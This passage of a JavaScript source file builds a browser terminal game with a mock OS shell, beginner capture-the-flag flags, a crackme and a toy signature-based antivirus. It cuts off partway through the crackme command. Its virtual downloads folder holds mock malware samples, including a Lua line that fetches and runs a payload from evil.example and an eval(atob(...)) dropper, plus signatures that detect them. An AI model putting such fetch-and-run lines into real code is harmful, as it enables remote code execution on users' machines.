// Canvas-rendered terminal running a tiny "SecureRustOS" shell with a virtual filesystem.
// The canvas becomes a texture on the CRT monitor in the 3D room.

import { CPU, assemble, disassemble, hex, REGS, PROGRAMS, CRACKME_SRC, CRACKME_INPUT } from './cpu.js';
import { runSQL, formatTable, runMongo } from './db.js';
import { shannon } from './entropy.js';
import { randomFrame, decode, hexdump, nmap, loginFrame, PCAP_FLAG } from './net.js';

const COLORS = {
  fg: '#39ff88', dim: '#5f8f74', amber: '#ffb347', red: '#ff5c7a', cyan: '#5ad1ff',
  purple: '#c792ea', white: '#e6fff0', bg: '#04090a',
};

// ------------------------------------------------------------------ virtual filesystem

const enc = new TextEncoder();
const dec = new TextDecoder();

function randomBytes(n) {
  const b = new Uint8Array(n);
  crypto.getRandomValues(b);
  return b;
}

// ------------------------------------------------------------------ CTF

export const FLAGS = [
  { id: 'dotfile', flag: 'flag{h1dd3n_d0tf1l3s}', hint: 'Some files hide from a plain `ls`.' },
  { id: 'base64', flag: 'flag{b4s3_64_1s_n0t_crypt0}', hint: '~/ctf/note.b64 is encoded, not encrypted.' },
  { id: 'rot13', flag: 'flag{r0t13_1s_n0t_crypt0_31th3r}', hint: '~/ctf/memo.txt: Caesar would be proud.' },
  { id: 'pcap', flag: PCAP_FLAG, hint: 'Someone logs in over plain HTTP. Sniff the wire.' },
  { id: 'trash', flag: 'flag{d0nt_thr0w_s3cr3ts_4w4y}', hint: 'Check what fell out of the trash can.' },
];
export function rot13(str) {
  return str.replace(/[a-z]/gi, (ch) => {
    const b = ch <= 'Z' ? 65 : 97;
    return String.fromCharCode(((ch.charCodeAt(0) - b + 13) % 26) + b);
  });
}

function makeFS() {
  const asm = {};
  for (const [k, v] of Object.entries(PROGRAMS)) asm[k] = v;
  return {
    etc: {
      hostname: 'engine-room\n',
      motd: 'Welcome to SecureRustOS (EG-8 edition). Hack the planet, responsibly.\n',
      'os-release': 'NAME="SecureRustOS"\nVERSION="0.3-dev"\nARCH="x86_32 + EG-8"\n',
    },
    quarantine: {},
    home: {
      engine: {
        '.flag': `You found a hidden dotfile!\n${FLAGS[0].flag}\nSubmit it with: submit <flag>\n`,
        '.bash_history': 'ls\ncd projects\nvim kernel.rs\n:q!\n:wq\nhow to exit vim\nsudo make me a sandwich\n',
        ctf: {
          'README.txt':
            'Engine Room CTF: find 5 flags that look like flag{...} and submit them: submit flag{...}\n' +
            'Progress: flags   Tools: ls -a, cat, base64 -d, rot13, strings, sniff, and your eyes in the room.\n' +
            'The scoreboard hangs on the wall next to the safe.\n',
          'note.b64': btoa(`Nice decoding! ${FLAGS[1].flag}`) + '\n',
          'memo.txt': rot13(`Top secret memo. The flag is ${FLAGS[2].flag}. Do not tell anyone.`) + '\n',
        },
        'README.txt':
          'This room is my brain dumped into three.js.\n' +
          'Try:  run knight.asm   entropy   scan   sniff   gdt   neofetch\n' +
          'Write your own program:  write my.asm  (finish with a single "." line), then  run my.asm\n',
        asm,
        re: {
          'crackme.bin': assemble(CRACKME_SRC).bytes,
          'README.txt':
            'crackme.bin: find the password!\n' +
            'Tools: hexdump crackme.bin | strings crackme.bin | load crackme.bin then dis 0 32\n' +
            'The program reads your guess from 0xC0. Test it with: crackme <password>\n' +
            'The laptop on the desk shows a Ghidra-style listing and decompiled view.\n',
        },
        projects: {
          SecureRustOS: {
            'boot.asm':
              '; stage 1 bootloader (NASM, 16-bit real mode)\n[org 0x7C00]\n[bits 16]\n' +
              'start:\n    cli\n    xor ax, ax\n    mov ds, ax\n    mov ss, ax\n    mov sp, 0x7C00\n' +
              '    in al, 0x92        ; fast A20\n    or al, 2\n    out 0x92, al\n' +
              '    lgdt [gdtr]\n    mov eax, cr0\n    or eax, 1          ; CR0.PE\n    mov cr0, eax\n' +
              '    jmp 0x08:pmode\n\ntimes 510-($-$$) db 0\ndw 0xAA55\n',
            'main.rs':
              '#![no_std]\n#![no_main]\n\nuse core::panic::PanicInfo;\n\n#[no_mangle]\n' +
              'pub extern "C" fn rust_main() -> ! {\n    vga::println!("Hello from SecureRustOS");\n' +
              '    gdt::init();\n    interrupts::init_idt();\n    loop { x86::hlt(); }\n}\n\n' +
              '#[panic_handler]\nfn panic(info: &PanicInfo) -> ! {\n    vga::println!("{}", info);\n    loop {}\n}\n',
          },
          EngineManager: { 'notes.md': '# EngineManager\nPassword manager. Keys derived with PBKDF2/Argon2, vault encrypted with AES-256-GCM.\nTry: vault gen 24\n' },
          EngineBuddy: { 'notes.md': '# EngineBuddy\nAI desktop companion. Say hi to the floating robot, or: buddy what is a gdt\n' },
          'Hybrid-Entropy': { 'README.md': '# Hybrid Entropy Computing Platform\nOptical entropy: camera pixels -> LSBs -> von Neumann -> SHA-256.\nThe lava lamp in this room does exactly that. Try: entropy 32\n' },
        },
        downloads: {
          'game_mod.lua': 'local part = Instance.new("Part")\npart.Anchored = true\npart.Parent = workspace\nprint("hello world")\n',
          'speed_hack.lua': '-- totally legit speed hack\nloadstring(game:HttpGet("http://evil.example/payload.lua"))()\n',
          'free_vbucks.exe': new Uint8Array([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0xde, 0xad, 0xbe, 0xef, 0x13, 0x37, 0x50, 0x45, 0x00, 0x00, 0x4c, 0x01]),
          'invoice.pdf.js': 'var p="ZG9jdW1lbnQ=";\neval(atob(p));\n',
          'packed_tool.bin': randomBytes(1024),
          'driver.sys': new Uint8Array(Array.from({ length: 512 }, (_, i) => (i * 7) & 0x3f)),
        },
      },
    },
  };
}

const SIGNATURES = [
  { name: 'EG.Trojan.VBucks', bytes: [0xde, 0xad, 0xbe, 0xef, 0x13, 0x37] },
  { name: 'EG.JS.Dropper', bytes: [...enc.encode('eval(atob(')] },
  { name: 'EG.Lua.Backdoor', bytes: [...enc.encode('loadstring(game:HttpGet(')] },
];

function findBytes(hay, needle) {
  outer: for (let i = 0; i <= hay.length - needle.length; i++) {
    for (let j = 0; j < needle.length; j++) if (hay[i + j] !== needle[j]) continue outer;
    return i;
  }
  return -1;
}

const toBytes = (c) => (typeof c === 'string' ? enc.encode(c) : c);

// ------------------------------------------------------------------ EngineBuddy brain

const BUDDY = [
  [/\b(hi|hello|hey|hallo)\b/, "Hi! I'm EngineBuddy. Ask me about GDTs, paging, the A20 line, Rust, or entropy."],
  [/gdt|descriptor/, 'The GDT holds 8-byte segment descriptors (base, limit, access, flags). lgdt loads its address. Type `gdt` to see real ones.'],
  [/a20/, 'A20 is the 21st address line. It is disabled at boot for 8086 compatibility. Enable it (port 0x92) or you only reach every other megabyte!'],
  [/paging|cr3|page/, 'Paging maps virtual to physical addresses via page directories/tables. CR3 holds the page directory base and CR0.PG turns it on.'],
  [/boot|mbr|7c00/, 'The BIOS loads the first 512-byte sector to 0x7C00 and checks for 0x55AA at the end. Then it is all yours.'],
  [/rust/, 'Rust in a kernel: #![no_std], a custom target, a panic handler, and `unsafe` only where the hardware demands it.'],
  [/entropy|random|lava/, 'Randomness from light: LSBs of lava-lamp pixels -> von Neumann debiasing -> SHA-256. Try `entropy 32`.'],
  [/virus|malware|antivirus|scan/, 'Engine\'s Antivirus matches byte signatures and flags files whose Shannon entropy is near 8 bits/byte (packed or encrypted). Try `scan`.'],
  [/password|vault/, 'Strong passwords come from strong entropy. A 20-char password over 94 symbols is ~131 bits. Try `vault gen 20`.'],
  [/cpu|eg-?8|asm|assembly/, 'EG-8 has 4 registers, 256 bytes of RAM and ports for LEDs, chars, entropy and the lamp. `cat ~/asm/knight.asm` to see a program.'],
  [/arduino|raspberry|pi|embedded|gpio/, 'GPIO is just memory-mapped or port-mapped bits. Here port 0x00 drives 8 LEDs. `leds 0b10101010`.'],
  [/vulkan|opengl|shader|gpu/, 'The wall screen runs fragment shaders: raymarched SDFs, plasma, Mandelbrot. Click it to switch. Vulkan would need ~1000 lines for that triangle ;)'],
  [/network|packet|wireshark|nmap/, 'Every packet in the rack capture is built byte by byte with a real IPv4 checksum. Try `sniff 5` or `nmap`.'],
  [/lua|roblox|game|arcade/, 'Where it all started: Lua game dev. Play Packet Catcher on the arcade cabinet, or drop bricks on the yellow table.'],
  [/crack|reverse|ghidra|ida/, 'Reverse engineering tip: strings first, then the disassembly. The crackme XORs every byte with a constant. Look at the table!'],
  [/sql|mysql|mongo|database/, 'The filing cabinet is a database. Try `sql SELECT * FROM projects` or `mongo db.devices.find({port: {$gt: 1000}})`.'],
  [/arm|robot|servo/, 'The robot arm listens on ports 0x30 (base), 0x31 (shoulder) and 0x32 (claw). `run arm.asm` or `arm 200 150 255`.'],
  [/scope|oscillo|logic analy/, 'The oscilloscope on the bench samples port 0x00 and draws all 8 LED bits as square waves. Try `run blink.asm`.'],
  [/ctf|flag/, 'CTF time! 5 flags hide in this room: a dotfile, a base64 note, a ROT13 memo, a sniffed login and something near the trash. `flags` shows hints.'],
  [/neural|machine learning|\bml\b|\bai\b|xor|train/, 'The easel runs a real 2-4-1 neural net learning XOR with backprop. Click it or type `train`, then `predict 1 0`.'],
  [/matrix|led/, 'The 8x24 LED matrix above the bench scrolls text (`matrix hello`). EG-8 can draw on it too: port 0x50 picks a column, 0x51 writes its 8 bits.'],
  [/print|3d/, 'The 3D printer on the TV cabinet slices models layer by layer. Click it or type `print`.'],
  [/solder|iron|pcb/, 'Soldering: heat the iron to ~350 °C, heat the pad AND the leg, then feed the solder. A good joint is a shiny little cone.'],
  [/make|build|qemu|compile/, '`make` builds SecureRustOS (nasm + cargo + ld) and `make run` boots it in "QEMU". The PC under the desk does the work.'],
  [/who are you|what are you/, "I'm EngineBuddy, a tiny keyword-matching AI. Not an LLM, just regexes with ambition."],
];

const TRIVIA = [
  'Fun fact: x86 CPUs start executing at physical address 0xFFFFFFF0, the reset vector.',
  'Fun fact: The PIC sends IRQs 0-7 to INT 0x08-0x0F by default, which clashes with CPU exceptions. Remap it!',
  'Fun fact: `int 0x10` with AH=0x0E prints a character in real mode.',
  'Fun fact: A triple fault resets the CPU. Every OS dev has seen a lot of them.',
  'Fun fact: The 0x55AA boot signature is stored little-endian as the bytes 55 AA at offsets 510-511.',
  'Fun fact: The von Neumann extractor turns biased coin flips into fair ones by only keeping 01 and 10 pairs.',
];

export function buddyReply(q = '', nextQuest = null) {
  const s = q.toLowerCase();
  if (nextQuest && /hint|help|what (should|can) i do|quest|bored/.test(s)) return `Next quest: "${nextQuest[1]}". ${nextQuest[2].replace(/`/g, '')}.`;
  for (const [re, a] of BUDDY) if (re.test(s)) return a;
  return TRIVIA[Math.floor(Math.random() * TRIVIA.length)];
}

// ------------------------------------------------------------------ GDT encoder

function gdtDescriptor(base, limit, access, flags) {
  const lo = ((limit & 0xffff) | ((base & 0xffff) << 16)) >>> 0;
  const hi = (((base >>> 16) & 0xff) | (access << 8) | (((limit >>> 16) & 0xf) << 16) | ((flags & 0xf) << 20) | (((base >>> 24) & 0xff) << 24)) >>> 0;
  return { lo, hi };
}

// ------------------------------------------------------------------ Terminal

export class Terminal {
  constructor(sys) {
    this.sys = sys; // { cpu, pool, irq, hooks... } provided by main.js
    this.canvas = document.createElement('canvas');
    this.canvas.width = 1024;
    this.canvas.height = 768;
    this.g = this.canvas.getContext('2d');
    this.fontSize = 19;
    this.lineH = 23;
    this.g.font = `${this.fontSize}px "DejaVu Sans Mono", "Consolas", "Courier New", monospace`;
    this.cw = this.g.measureText('M').width;
    this.margin = 34;
    this.cols = Math.floor((this.canvas.width - this.margin * 2) / this.cw);
    this.rows = Math.floor((this.canvas.height - 70) / this.lineH) - 1;
    this.lines = [];
    this.openLine = false; // CPU putc appends to last line
    this.input = '';
    this.cursor = 0;
    this.history = [];
    this.histIdx = 0;
    this.scroll = 0;
    this.mode = 'boot';
    this.queue = [];
    this.queueTimer = 0;
    this.blink = 0;
    this.dirty = true;
    this.statusTimer = 0;
    this.writeTarget = null;
    this.writeBuf = [];
    this.fs = makeFS();
    this.ctfFound = new Set();
    try { JSON.parse(localStorage.getItem('engineRoomFlags') || '[]').forEach((x) => this.ctfFound.add(x)); } catch { /* ignore */ }
    this.cwd = ['home', 'engine'];
    this.bootTime = performance.now();
    this.boot();
  }

  // ---------------------------------------------------------------- output

  print(text = '', color = COLORS.fg) {
    for (const raw of String(text).split('\n')) {
      let s = raw;
      do {
        this.lines.push({ text: s.slice(0, this.cols), color });
        s = s.slice(this.cols);
      } while (s.length);
    }
    this.openLine = false;
    if (this.lines.length > 600) this.lines.splice(0, this.lines.length - 600);
    this.scroll = 0;
    this.dirty = true;
  }

  // character output from the EG-8 CPU (port 0x01)
  putc(code) {
    if (code === 10) { this.openLine = false; this.lines.push({ text: '', color: COLORS.amber }); this.openLine = true; this.dirty = true; return; }
    if (!this.openLine || !this.lines.length) { this.lines.push({ text: '', color: COLORS.amber }); this.openLine = true; }
    const last = this.lines[this.lines.length - 1];
    if (last.text.length >= this.cols) { this.lines.push({ text: '', color: COLORS.amber }); }
    this.lines[this.lines.length - 1].text += code >= 32 && code < 127 ? String.fromCharCode(code) : '.';
    this.dirty = true;
  }

  queueLines(items) {
    for (const it of items) this.queue.push(it);
  }

  boot() {
    this.sys.sound?.('bootBeep');
    this.lines = [];
    this.mode = 'boot';
    const c = COLORS;
    this.queueLines([
      ['EngineBIOS v2.6  (c) EngineGames-Development', c.white, 300],
      ['CPU0: EG-8 8-bit core @ ' + this.sys.getHz() + ' Hz    Host: x86_64 (emulated)', c.dim, 120],
      ['Memory test: 256 bytes OK', c.dim, 250],
      ['Detecting drives... ata0: SECURERUST.IMG (1.44 MB)', c.dim, 200],
      ['Booting from ata0: loading MBR to 0000:7C00', c.fg, 220],
      ['[stage1] boot signature 0x55AA ............ OK', c.fg, 120],
      ['[stage1] enable A20 (fast A20, port 0x92) .. OK', c.fg, 120],
      ['[stage1] lgdt [gdtr]  limit=0x002F base=0x00007E00', c.fg, 120],
      ['[stage1] CR0.PE=1 -> jmp 0x08:protected_mode', c.fg, 160],
      ['[stage2] 32-bit protected mode, esp=0x00090000', c.cyan, 120],
      ['[kernel] paging: identity map 0-4MiB, CR3=0x00100000, CR0.PG=1', c.cyan, 120],
      ['[kernel] IDT loaded (256 gates), PIC remapped to 0x20/0x28', c.cyan, 120],
      ['[kernel] IRQ0: PIT 100 Hz   IRQ1: PS/2 keyboard', c.cyan, 120],
      ['[kernel] drivers: vga eg8-cpu gpio-leds optical-rng nic0 av-engine', c.cyan, 160],
      ['[kernel] rust_main() reached.', c.purple, 250],
      ['', c.fg, 0],
      ['Welcome to SecureRustOS 0.3-dev (tty0)', c.white, 0],
      ["Type 'help' for commands, 'cat README.txt' to start. Esc leaves the terminal.", c.dim, 0],
      ['', c.fg, 0],
      [null, null, 0], // marker: switch to shell mode
    ]);
  }

  // ---------------------------------------------------------------- input

  handleKey(e) {
    this.sys.irq.kbd++;
    if (e.ctrlKey && (e.key === 'c' || e.key === 'C')) {
      if (this.mode === 'write') { this.mode = 'shell'; this.print('^C (write cancelled)', COLORS.red); }
      else if (!this.sys.cpu.halted) { this.sys.cpu.halted = true; this.print('^C  EG-8 halted', COLORS.red); }
      else { this.print(this.promptText() + this.input + '^C', COLORS.dim); }
      this.input = ''; this.cursor = 0;
      return;
    }
    if (e.ctrlKey && (e.key === 'l' || e.key === 'L')) { this.lines = []; this.dirty = true; return; }
    if (this.mode === 'boot' && e.key === 'Enter') {
      while (this.queue.length) this.flushOne(); // Enter skips the boot animation
    }
    const k = e.key;
    if (k === 'Enter') {
      const line = this.input;
      this.input = ''; this.cursor = 0;
      this.submit(line);
    } else if (k === 'Backspace') {
      if (this.cursor > 0) { this.input = this.input.slice(0, this.cursor - 1) + this.input.slice(this.cursor); this.cursor--; }
    } else if (k === 'Delete') {
      this.input = this.input.slice(0, this.cursor) + this.input.slice(this.cursor + 1);
    } else if (k === 'ArrowLeft') this.cursor = Math.max(0, this.cursor - 1);
    else if (k === 'ArrowRight') this.cursor = Math.min(this.input.length, this.cursor + 1);
    else if (k === 'Home') this.cursor = 0;
    else if (k === 'End') this.cursor = this.input.length;
    else if (k === 'ArrowUp' && this.mode === 'shell') {
      if (this.histIdx > 0) { this.histIdx--; this.input = this.history[this.histIdx]; this.cursor = this.input.length; }
    } else if (k === 'ArrowDown' && this.mode === 'shell') {
      if (this.histIdx < this.history.length) { this.histIdx++; this.input = this.history[this.histIdx] ?? ''; this.cursor = this.input.length; }
    } else if (k === 'PageUp') this.scroll = Math.min(this.scroll + 10, Math.max(0, this.lines.length - this.rows));
    else if (k === 'PageDown') this.scroll = Math.max(0, this.scroll - 10);
    else if (k === 'Tab') this.complete();
    else if (k.length === 1 && !e.ctrlKey && !e.metaKey) {
      this.input = this.input.slice(0, this.cursor) + k + this.input.slice(this.cursor);
      this.cursor++;
    } else return;
    this.blink = 0;
    this.dirty = true;
  }

  promptText() {
    if (this.mode === 'write') return '> ';
    return `engine@securerust:${this.pathString(this.cwd)}$ `;
  }

  complete() {
    const parts = this.input.split(' ');
    const last = parts[parts.length - 1];
    let options;
    if (parts.length === 1) options = Object.keys(this.commands());
    else {
      const slash = last.lastIndexOf('/');
      const dirPart = slash >= 0 ? last.slice(0, slash + 1) : '';
      const dir = this.resolve(dirPart || '.');
      const node = this.get(dir);
      options = node && typeof node === 'object' && !(node instanceof Uint8Array)
        ? Object.keys(node).map((n) => dirPart + n + (this.isDir(node[n]) ? '/' : ''))
        : [];
    }
    const matches = options.filter((o) => o.startsWith(last));
    if (matches.length === 1) {
      parts[parts.length - 1] = matches[0] + (parts.length === 1 ? ' ' : '');
      this.input = parts.join(' ');
      this.cursor = this.input.length;
    } else if (matches.length > 1) {
      this.print(this.promptText() + this.input, COLORS.dim);
      this.print(matches.join('  '), COLORS.cyan);
    }
  }

  async submit(line) {
    if (this.mode === 'write') {
      if (line === '.') {
        this.writeFile(this.writeTarget, this.writeBuf.join('\n') + '\n');
        this.print(`> .`, COLORS.dim);
        this.print(`saved ${this.writeBuf.length} lines to ${this.writeTarget}`, COLORS.cyan);
        this.mode = 'shell';
      } else {
        this.print('> ' + line, COLORS.white);
        this.writeBuf.push(line);
      }
      return;
    }
    this.print(this.promptText() + line, COLORS.white);
    const trimmed = line.trim();
    if (!trimmed) return;
    this.history.push(trimmed);
    this.histIdx = this.history.length;
    const [cmd, ...args] = trimmed.split(/\s+/);
    const fn = this.commands()[cmd];
    if (!fn) { this.print(`${cmd}: command not found (try 'help')`, COLORS.red); this.sys.sound?.('error'); return; }
    try {
      await fn.call(this, args, trimmed.slice(cmd.length).trim());
    } catch (err) {
      this.print(`${cmd}: ${err.message}`, COLORS.red);
    }
  }

  // ---------------------------------------------------------------- filesystem helpers

  isDir(n) { return n && typeof n === 'object' && !(n instanceof Uint8Array); }
  pathString(p) {
    const s = '/' + p.join('/');
    return s.startsWith('/home/engine') ? '~' + s.slice('/home/engine'.length) : s;
  }
  resolve(path) {
    let parts = path.startsWith('/') ? [] : path.startsWith('~') ? ['home', 'engine'] : [...this.cwd];
    if (path.startsWith('~')) path = path.slice(1);
    for (const seg of path.split('/')) {
      if (!seg || seg === '.') continue;
      if (seg === '..') parts.pop(); else parts.push(seg);
    }
    return parts;
  }
  get(parts) {
    let n = this.fs;
    for (const p of parts) {
      if (!this.isDir(n) || !(p in n)) return undefined;
      n = n[p];
    }
    return n;
  }
  // finds a file by path, falling back to ~/asm/<name> for convenience
  findFile(name) {
    let p = this.resolve(name);
    let n = this.get(p);
    if (n === undefined && !name.includes('/')) {
      p = ['home', 'engine', 'asm', name];
      n = this.get(p);
    }
    if (n === undefined) throw new Error(`${name}: no such file`);
    if (this.isDir(n)) throw new Error(`${name}: is a directory`);
    return { path: p, data: n };
  }
  writeFile(name, content) {
    const p = this.resolve(name);
    const file = p.pop();
    const dir = this.get(p);
    if (!this.isDir(dir)) throw new Error('no such directory');
    dir[file] = content;
  }

  // ---------------------------------------------------------------- CPU helpers

  loadProgram(name) {
    const { data } = this.findFile(name);
    const src = typeof data === 'string' ? data : dec.decode(data);
    const res = assemble(src);
    if (res.errors.length) {
      res.errors.slice(0, 8).forEach((e) => this.print(e, COLORS.red));
      throw new Error('assembly failed');
    }
    this.sys.cpu.load(res.bytes);
    this.sys.onProgramLoaded?.(name);
    return res;
  }

  // ---------------------------------------------------------------- commands

  commands() {
    const c = COLORS;
    const t = this;
    const sys = this.sys;
    const cpu = sys.cpu;
    return {
      help() {
        const groups = [
          ['shell', 'ls cd pwd cat echo write rm clear history whoami uname date uptime neofetch reboot'],
          ['EG-8 cpu', 'asm <f>  run [f]  stop  step [n]  regs  mem [addr]  dis [addr]  clock [hz]  leds <v>  reset'],
          ['low-level', 'gdt  irq  memmap  cpuinfo  lsdev  ps  hexdump <f>  make [run]'],
          ['reversing', 'strings <f>  load <f.bin|f.asm>  crackme <password>   (start: cat ~/re/README.txt)'],
          ['security', 'scan  entropy [n]  vault gen [len]  vault hash <txt>  nmap  sniff [n]'],
          ['database', 'sql <SELECT ...|SHOW TABLES|DESCRIBE t>   mongo db.<coll>.find({...})'],
          ['ctf', 'ls -a  base64 [-d] <f>  rot13 <f>  submit flag{...}  flags'],
          ['ai/maker', 'train [reset]  predict <a> <b>  matrix <text>  print'],
          ['room', 'quests  buddy <question>  gpu [mode]  lights  lamp <hue>  arm <b> <s> <c>  solder on|off  drone  exit'],
          ['fun', 'sl  cowsay <txt>  fortune  cmatrix  sudo  vim'],
        ];
        t.print('SecureRustOS shell - available commands:', c.white);
        for (const [g, cmds] of groups) t.print(`  ${g.padEnd(10)} ${cmds}`, c.fg);
        t.print('Tips: Tab completes, Up/Down = history, PgUp/PgDn scroll, Ctrl+C halts the CPU.', c.dim);
      },
      clear() { t.lines = []; t.dirty = true; },
      pwd() { t.print('/' + t.cwd.join('/')); },
      ls(args) {
        const all = args.some((x) => /^-\w*a/.test(x));
        const target = args.find((x) => !x.startsWith('-'));
        const p = t.resolve(target ?? '.');
        const n = t.get(p);
        if (n === undefined) throw new Error('no such file or directory');
        if (!t.isDir(n)) { t.print(target); return; }
        const names = Object.keys(n).filter((k) => all || !k.startsWith('.')).sort();
        if (!names.length) { t.print('(empty)', c.dim); return; }
        const out = names.map((k) => (t.isDir(n[k]) ? k + '/' : k));
        const width = Math.max(...out.map((s) => s.length)) + 2;
        const per = Math.max(1, Math.floor(t.cols / width));
        for (let i = 0; i < out.length; i += per) {
          t.print(out.slice(i, i + per).map((s) => s.padEnd(width)).join(''), c.cyan);
        }
      },
      cd(args) {
        const p = t.resolve(args[0] ?? '~');
        if (!t.isDir(t.get(p))) throw new Error('not a directory');
        t.cwd = p;
      },
      cat(args) {
        if (!args[0]) throw new Error('usage: cat <file>');
        const { data } = t.findFile(args[0]);
        if (data instanceof Uint8Array) { t.print('binary file, use hexdump', c.amber); return; }
        t.print(data.replace(/\n$/, ''), c.white);
      },
      echo(_, rest) { t.print(rest); },
      write(args) {
        if (!args[0]) throw new Error('usage: write <file>   (end with a line containing only ".")');
        t.writeTarget = args[0];
        t.writeBuf = [];
        t.mode = 'write';
        t.print(`writing ${args[0]} - end with a single "." on its own line, Ctrl+C cancels`, c.dim);
      },
      rm(args) {
        if (args.includes('/') || args.includes('/*')) {
          t.print("rm: it is dangerous to operate recursively on '/'", c.red);
          t.print('rm: nice try. Tux has hidden the root filesystem behind the bean bag.', c.purple);
          sys.sound?.('error');
          return;
        }
        args = args.filter((x) => !x.startsWith('-'));
        const p = t.resolve(args[0] ?? '');
        const f = p.pop();
        const dir = t.get(p);
        if (!t.isDir(dir) || !(f in dir)) throw new Error('no such file');
        delete dir[f];
      },
      history() { t.history.forEach((h, i) => t.print(`${String(i + 1).padStart(4)}  ${h}`, c.dim)); },
      whoami() { t.print('engine'); },
      hostname() { t.print('engine-room'); },
      uname(args) { t.print(args[0] === '-a' ? 'SecureRustOS engine-room 0.3-dev #1 SMP x86_32 EG-8 GNU/Rust' : 'SecureRustOS'); },
      date() { t.print(new Date().toString()); },
      uptime() {
        const s = Math.floor((performance.now() - t.bootTime) / 1000);
        t.print(`up ${Math.floor(s / 60)} min ${s % 60} s, 1 user, load average: 0.${(cpu.halted ? 0 : 42)}`);
      },
      reboot() { sys.cpu.halted = true; t.boot(); },
      exit() { sys.onExit?.(); },
      neofetch() {
        const art = [
          '   ______   ',
          '  / ____/   ',
          ' / __/      ',
          '/ /___      ',
          '\\____/ ngine',
          '            ',
          '            ',
        ];
        const info = [
          ['', 'engine@securerust'],
          ['OS', 'SecureRustOS 0.3-dev x86_32'],
          ['Kernel', 'rust_main (no_std)'],
          ['CPU', `EG-8 @ ${sys.getHz()} Hz (${cpu.halted ? 'halted' : 'running'})`],
          ['Memory', '256 B'],
          ['Langs', 'Rust C C++ ASM Python JS Lua'],
          ['Interests', 'OS dev, RE, security, embedded, AI'],
        ];
        art.forEach((a, i) => {
          const [k, v] = info[i];
          t.lines.push({ text: (a + '   ' + (k ? k + ': ' : '') + v).slice(0, t.cols), color: i === 0 ? c.purple : c.fg });
        });
        t.print('   ' + ['#ff5c7a', '#ffb347', '#39ff88', '#5ad1ff', '#c792ea'].map(() => '███').join(''), c.purple);
      },

      // ---- EG-8
      asm(args) {
        if (!args[0]) throw new Error('usage: asm <file.asm>');
        const res = t.loadProgram(args[0]);
        t.print(`assembled ${args[0]}: ${res.size} bytes, ${Object.keys(res.labels).length} labels`, c.cyan);
        for (const l of hexdump(res.bytes, 128)) t.print(l, c.dim);
        const labels = Object.entries(res.labels).map(([k, v]) => `${k}=0x${hex(v)}`).join(' ');
        if (labels) t.print('labels: ' + labels, c.dim);
      },
      run(args) {
        if (args[0]) {
          const res = t.loadProgram(args[0]);
          t.print(`loaded ${args[0]} (${res.size} bytes) at 0x00`, c.dim);
        }
        if (cpu.mem.every((b) => b === 0)) throw new Error('no program loaded (try: run knight.asm)');
        cpu.halted = false;
        t.print(`EG-8 running @ ${sys.getHz()} Hz. 'stop' or Ctrl+C to halt.`, c.cyan);
      },
      stop() { cpu.halted = true; t.print(`EG-8 halted at PC=0x${hex(cpu.pc)} after ${cpu.cycles} instructions`, c.amber); },
      reset() { cpu.reset(); sys.setLeds(0); t.print('EG-8 reset (memory kept)', c.amber); },
      step(args) {
        const n = Math.min(parseInt(args[0] ?? '1', 10) || 1, 64);
        for (let i = 0; i < n; i++) {
          const [d] = disassemble(cpu.mem, cpu.pc, 1);
          cpu.halted = false; // single-step: run exactly one instruction, then stay halted
          cpu.sleep = 0;
          cpu.step();
          cpu.halted = true;
          if (cpu.error) { t.print(cpu.error, c.red); break; }
          t.print(`${hex(d.addr)}: ${d.bytes.map((b) => hex(b)).join(' ').padEnd(9)} ${d.text.padEnd(18)} ${regLine(cpu)}`, c.fg);
          if (d.text === 'HLT') break;
        }
      },
      regs() {
        t.print(regLine(cpu), c.cyan);
        t.print(`cycles=${cpu.cycles} state=${cpu.halted ? 'HALTED' : 'RUNNING'}${cpu.error ? ' error: ' + cpu.error : ''}`, c.dim);
      },
      mem(args) {
        const start = (parseInt(args[0] ?? '0') || 0) & 0xf0;
        const len = parseInt(args[1] ?? '128') || 128;
        for (let o = start; o < Math.min(256, start + len); o += 16) {
          const row = Array.from(cpu.mem.slice(o, o + 16));
          const h = row.map((b, i) => {
            const a = o + i;
            return a === cpu.pc ? `>${hex(b)}` : a === cpu.sp ? `*${hex(b)}` : ` ${hex(b)}`;
          }).join('');
          const asc = row.map((b) => (b >= 32 && b < 127 ? String.fromCharCode(b) : '.')).join('');
          t.print(`${hex(o)}:${h}  ${asc}`, c.fg);
        }
        t.print('> = PC   * = SP', c.dim);
      },
      dis(args) {
        const start = parseInt(args[0] ?? '0') || 0;
        for (const d of disassemble(cpu.mem, start, parseInt(args[1] ?? '16') || 16)) {
          const mark = d.addr === cpu.pc ? '=>' : '  ';
          t.print(`${mark} ${hex(d.addr)}: ${d.bytes.map((b) => hex(b)).join(' ').padEnd(9)} ${d.text}`, d.addr === cpu.pc ? c.amber : c.fg);
        }
      },
      clock(args) {
        if (args[0]) {
          const hz = Math.max(1, Math.min(100000, parseInt(args[0], 10) || 400));
          sys.setHz(hz);
        }
        t.print(`EG-8 clock: ${sys.getHz()} Hz`, c.cyan);
      },
      leds(args) {
        const v = parseInt((args[0] ?? '0').replace(/^0b/, ''), args[0]?.startsWith('0b') ? 2 : undefined) & 0xff;
        sys.setLeds(v);
        t.print(`port 0x00 <- 0x${hex(v)}  [${v.toString(2).padStart(8, '0').replace(/1/g, '●').replace(/0/g, '○')}]`, c.amber);
      },
      lamp(args) {
        const v = (parseInt(args[0] ?? '128') || 0) & 0xff;
        sys.setLampHue(v);
        t.print(`port 0x20 <- 0x${hex(v)} (desk lamp hue)`, c.amber);
      },

      load(args) {
        if (!args[0]) throw new Error('usage: load <file.bin|file.asm>');
        const { data } = t.findFile(args[0]);
        if (typeof data === 'string') { const r = t.loadProgram(args[0]); t.print(`assembled and loaded ${r.size} bytes at 0x00`, c.cyan); return; }
        cpu.load(data);
        t.print(`loaded ${data.length} raw bytes at 0x00 (try: dis 0 32, mem)`, c.cyan);
      },
      strings(args) {
        if (!args[0]) throw new Error('usage: strings <file>');
        const b = toBytes(t.findFile(args[0]).data);
        let cur = '', at = 0, n = 0;
        const flush = () => { if (cur.length >= 4) { t.print(`0x${hex(at)}  ${cur.replace(/\n/g, '\\n')}`, c.amber); n++; } cur = ''; };
        b.forEach((x, i) => {
          if (x >= 32 && x < 127 || x === 10) { if (!cur) at = i; cur += String.fromCharCode(x); } else flush();
        });
        flush();
        if (!n) t.print('(no printable strings of length >= 4)', c.dim);
      },
      crackme(_, rest) {
        if (!rest) throw new Error('usage: crackme <password>   (hint: cat ~/re/README.txt)');
        const bin = t.fs.home.engine.re?.['crackme.bin'] ?? assemble(CRACKME_SRC).bytes;
        const vm = new CPU();
        let out = '';
